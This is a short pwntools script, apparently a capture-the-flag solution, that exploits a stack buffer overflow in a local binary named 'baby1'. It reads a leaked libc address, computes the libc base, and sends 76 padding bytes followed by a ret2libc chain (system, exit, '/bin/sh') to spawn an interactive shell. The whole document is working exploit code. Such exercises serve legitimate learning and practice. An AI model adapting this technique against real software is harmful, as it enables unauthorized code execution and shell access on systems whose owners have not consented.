#!/usr/bin/env python
from pwn import *

p = process("./baby1")
libc = ELF("./libc.so.6")

leak = int(p.recvuntil('\n')[10:], 16)
print hex(leak)
libc_base = leak - libc.symbols['_IO_2_1_stdout_']
print hex(libc_base)

system = libc_base + libc.symbols["system"]
exit = libc_base + libc.symbols["exit"] 
bin_sh = libc_base + libc.search("/bin/sh\x00").next() 
	 
payload = p32(system) + p32(exit) + p32(bin_sh)

p.sendlineafter('overflow me:', 'A' * 76 + payload)
p.interactive()
